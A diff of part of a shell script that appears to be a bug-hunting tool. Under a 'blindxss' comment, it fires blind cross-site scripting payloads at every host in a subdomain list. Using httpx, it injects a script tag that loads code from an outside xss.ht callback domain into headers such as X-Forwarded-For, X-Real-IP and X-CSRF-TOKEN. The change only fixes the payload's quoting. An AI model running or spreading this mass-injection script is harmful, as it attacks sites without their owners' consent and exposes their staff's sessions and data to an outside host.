@@ -31,11 +31,11 @@ sleep 1
 #blindxss
 
 
-httpx -l $1subdomain.txt -H "X-Forwarded-for: "><script src=https://husseinphp23.xss.ht></script>" -H "X-forwarded-ip: "><script src=https://husseinphp23.xss.ht></script>" -H "cf-connecting-ip: "><script src=https://husseinphp23.xss.ht></script>"
+httpx -l $1subdomain.txt -H "X-Forwarded-for: ><script src=https://husseinphp23.xss.ht></script>" -H "X-forwarded-ip: ><script src=https://husseinphp23.xss.ht></script>" -H "cf-connecting-ip: ><script src=https://husseinphp23.xss.ht></script>"
 
 sleep 1
 
-httpx -l $1subdomain.txt  -H "X-Client-ip: "><script src=https://husseinphp23.xss.ht></script>" -H "X-real-ip: "><script src=https://husseinphp23.xss.ht></script>" -H "X-request-uri: "><script src=https://husseinphp23.xss.ht></script>" \  -H "X-XSRF-TOKEN: "><script src=https://husseinphp23.xss.ht></script>" -H "X-CSRF-TOKEN: "><script src=https://husseinphp23.xss.ht></script>"
+httpx -l $1subdomain.txt  -H "X-Client-ip: ><script src=https://husseinphp23.xss.ht></script>" -H "X-real-ip: ><script src=https://husseinphp23.xss.ht></script>" -H "X-request-uri: ><script src=https://husseinphp23.xss.ht></script>" \  -H "X-XSRF-TOKEN: ><script src=https://husseinphp23.xss.ht></script>" -H "X-CSRF-TOKEN: ><script src=https://husseinphp23.xss.ht></script>"
 
 
  echo " BLIND XSS  successfully  " 
